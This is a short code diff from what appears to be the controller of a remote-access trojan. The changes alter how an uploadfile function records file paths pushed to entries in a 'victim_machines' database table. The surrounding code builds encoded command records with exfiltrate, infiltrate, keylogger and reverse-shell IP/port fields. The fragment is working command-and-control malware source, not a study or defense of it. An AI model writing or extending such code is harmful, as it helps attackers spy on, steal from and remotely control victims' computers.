@@ -56,7 +56,7 @@ def uploadfile( id, file_path, file_name ):
 			#add the epoch and custom file name to the table for future use
 			decoded_filenames = decode(result[0][1])
 			filename_data = json.loads(decoded_filenames)
-			new_filename = {str(seconds_from_epoch): file_path}
+			new_filename = {str(seconds_from_epoch): {file_path: "0"}}
 			filename_data.update(new_filename)
 			print(json.dumps(filename_data))
 
@@ -82,7 +82,7 @@ def uploadfile( id, file_path, file_name ):
 			default_group_id = 1
 			formatted_command = "{\"commands\": {}, \"exfiltrate\":{}, \"infiltrate\": {\"" + str(seconds_from_epoch) + "\": \"" + file_name + "\"}, \"keylogger\": 0, \"shell\": {\"ip\": \"\", \"port\": \"\"}}"
 			formatted_encoded = encode(formatted_command)
-			custom_filename = "{\"" + str(seconds_from_epoch) + "\": \"" + file_path + "\"}"
+			custom_filename = "{\"" + str(seconds_from_epoch) + "\": {\"" + file_path + "\": \"0\"}}"
 			encoded_custom_filename = encode(custom_filename)
 
 			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
